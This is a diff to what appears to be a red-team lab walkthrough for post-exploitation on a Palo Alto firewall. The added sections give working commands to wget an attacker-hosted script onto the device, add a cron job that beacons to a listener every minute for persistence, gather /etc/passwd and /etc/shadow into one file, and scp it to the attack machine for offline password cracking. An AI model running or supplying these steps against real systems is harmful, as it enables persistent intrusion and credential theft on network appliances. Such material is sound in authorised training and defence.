@@ -157,26 +157,67 @@ Section 2. Execute the PoC Script
 
 
 
+# Phase 2: Palo Persistence
+
+Once you are in the Palo Alto's bash shell, remember that this shell has limited functionality. Features like the tab key for autocompletion and the up/down arrow keys won’t work. The first priority is to establish persistence using a cron job and the pan_os_comm.py script you created earlier.
+
+1. Start by running some basic enumeration commands to get a sense of your current environment on the machine.
+   ```
+   whoami (response should be "root")
+   pwd
+   ls
+   ```
+2. Next, import the pan_os_comm.py script from your attack machine, where it is being hosted via the web server.
+   `wget -O /usr/local/bin/pan_os_comm.py http://<IP_of_your_attack_box>:<port>/pan_os_comm.py`
+
+3. To ensure that the file has been successfully downloaded and is executable, run:
+   `ls -l /usr/local/bin | grep pan_os`
+
+4. Once you’ve confirmed the script is there, it’s time to set up the cron job to maintain persistence. To add the cron job, execute the following command:
+   `(crontab -l 2>/dev/null; echo "* * * * * /usr/bin/python3 /usr/local/bin/pan_os_comm.py >/dev/null 2>&1") | crontab -`
+	NOTE- This will add a cron job that runs every minute, calling your pan_os_comm.py script and sending a beacon to your second listener.
+
+5. To check that your cron job has been successfully added, run the following:
+   `crontab -l`
+   	NOTE- This should display the current cron jobs, confirming that the job was added. The cron job will send a beacon to your listener every minute, ensuring that even if you lose access, you can reopen the listener using the same port, and it will catch the beacon again.
+
+#Phase 3: Enumeration and Exfil
+
+Now that we have a way to return to the system, let’s gather critical files containing sensitive data, which can be exfiltrated and reviewed offline for password cracking.
+
+1. We’ll start by viewing some important files and saving them to a new document for exfiltration:
+   ```
+   cat /etc/passwd > users.txt
+   cat /etc/shadow >> users.txt  # Notice the '>>', it appends the content of /etc/shadow
+   cat /etc/hosts >> users.txt   # Append /etc/hosts to the same file
+
+   ```
+   NOTE: The >> operator ensures that the contents of /etc/shadow and /etc/hosts are appended to users.txt. If you use >, the file will be overwritten.
+
+2. Next, use SCP to securely copy the users.txt file to your attack machine:
+   `scp users.txt kali@<your_ip_address>:.`
+	NOTE: Make sure to replace <your_ip_address> with the actual IP address of your attack machine, and specify the path where you want the file to be saved.
+
+3. On your attack machine, open a new terminal, navigate to your home folder, and check if the file has been transferred successfully:
+   ```
+   cd ~
+   ls | grep users.txt
+   ```
+4. Once you’ve confirmed that the file has been successfully transferred, you can exit the compromised machine. Your beacon terminal should still be active, allowing you to regain access at any time.
+   `exit`
 
 
-Post-Exploitation:
-● Upgrade shell if necessary.
-● Identify internal routes/interfaces.
-● Upload a simple proxy (e.g., socat or chisel) if needed for tunneling
+
+
+	
+   
 
 
 
 
 
 
-
-
-
-
-
-
-
-# Phase 2: Internal Reconnaissance & Enumeration
+# Phase 3: Internal Reconnaissance & Enumeration
 Once inside the firewall OS:
 ### Identify internal interfaces and routes
 
